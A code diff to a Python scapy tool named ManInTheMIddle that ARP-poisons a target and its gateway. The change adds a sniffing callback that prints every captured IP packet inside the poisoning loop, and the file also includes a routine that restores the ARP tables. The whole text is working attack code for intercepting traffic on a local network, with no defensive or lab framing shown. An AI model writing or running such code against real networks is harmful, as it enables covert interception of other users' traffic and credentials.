@@ -29,12 +29,17 @@ class ManInTheMIddle():
         # heal the target
         packet = scapy.ARP(op = 2, pdst = self.ip_target, hwdst = scapy.getmacbyip(self.ip_target), psrc = self.ip_gateway, hwsrc = scapy.getmacbyip(self.ip_gateway))
         scapy.send(packet, verbose = False)
-        
+    
+    def prn_callback(self, packet):
+        print(packet.show())
+
     def ConductAttack(self):
         self.GetAttackInfo()
         try:
             while True:
                 self.poison()
+
+                scapy.sniff(prn=self.prn_callback, filter="ip", count=0)
                 time.sleep(self.interval)
         except KeyboardInterrupt:
             self.heal()
